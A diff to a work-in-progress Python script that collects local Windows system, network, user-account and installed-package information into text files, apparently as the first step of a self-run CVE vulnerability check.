@@ -3,12 +3,15 @@
 #       the system itself to check against CVE
 # ----------------------------------------------
 import subprocess as sp
+import os
 import platform
 
 # -------------------------------------------------
     # CONSTANTS
 # -------------------------------------------------
-POWERSHELL = sp.getoutput("where powershell")
+# POWERSHELL = sp.getoutput("where powershell")
+FILENAME = ""
+INFO_FILE = ""
 
 def scanner():
 
@@ -18,17 +21,27 @@ def scanner():
 # -------------------------------------------------
 # -------------------------------------------------
 
-    # create file using hostname_systemreport.log
+    # create file using 
+	#	hostname_systeminfo.txt for general system info
+	# 	hostname_packages.txt for packages report
 	hostname = sp.getoutput("hostname")
 	hostname_tokens = hostname.split('.')
-	filename = hostname_tokens[0] + "_system_report.log"
-	file = open(filename, "w")
-	
-	# get basic system info
-	system_info = sp.getoutput("systeminfo")
+	FILENAME = hostname_tokens[0] + "_packages.txt"
+	INFO_FILE = hostname_tokens[0] + "_systeminfo.txt"
+	# file = open(FILENAME, "w")
+	#infofile = open(FILENAME, "w")
 
+	# get basic system info
+	sp.getoutput(str("echo 'SYSTEM' >> " + INFO_FILE))
+	sp.getoutput(str("systeminfo >> " + INFO_FILE))
+	
 	# get ip info
-	ipconfig = sp.getoutput("ipconfig /all")
+	sp.getoutput(str("echo . >> " + INFO_FILE + " && echo . >> " + INFO_FILE + "&& echo 'IP' >> " + INFO_FILE))
+	sp.getoutput(str("ipconfig /all >> " + INFO_FILE))
+
+	# get user info
+	sp.getoutput(str("echo . >> " + INFO_FILE + " && echo . >> " + INFO_FILE + "&& echo 'USER' >> " + INFO_FILE))
+	sp.getoutput(str("net user >> " + INFO_FILE))
 	
 # -------------------------------------------------
 # -------------------------------------------------
@@ -36,20 +49,15 @@ def scanner():
 # -------------------------------------------------
 # -------------------------------------------------
 	# get installed packages - save to diff file
-	package_versions = sp.getoutput('powershell -command "Get-Package -MinimumVersion 0.0 | Sort-Object Name | ft Name,Version,ProviderName >> secretinfohehe.txt"', shell=True)
+	#sp.run('powershell.exe "Get-Package -MinimumVersion 0.0 | Sort-Object Name | ft Name,Version,ProviderName >> secretinfohehe.txt"')
 	
-	# get installed packages (FUILL PROPERTIES) - save to diff file
-	package_versions_extended = sp.getoutput('powershell -command "Get-Package -MinimumVersion 0.0 | Select-Object -Property * | Sort-Object Name >> secretinfohehe.txt"', shell=True)
+	# get installed packages (FULL PROPERTIES) - save to diff file
+	#sp.run('powershell.exe "Get-Package -MinimumVersion 0.0 | Select-Object -Property * | Sort-Object Name >> secretinfohehe.txt"')
 	
-
-    # clean txt file -> anything that doesn't have a version should not be used in next part
-
-    # search JSON CVE for each program in txt file
-
-    # record any hits in hits.txt + their severity
+    
 
     # return to bonfire
-	file.close()
+	#file.close()
 	return()
         
 scanner()
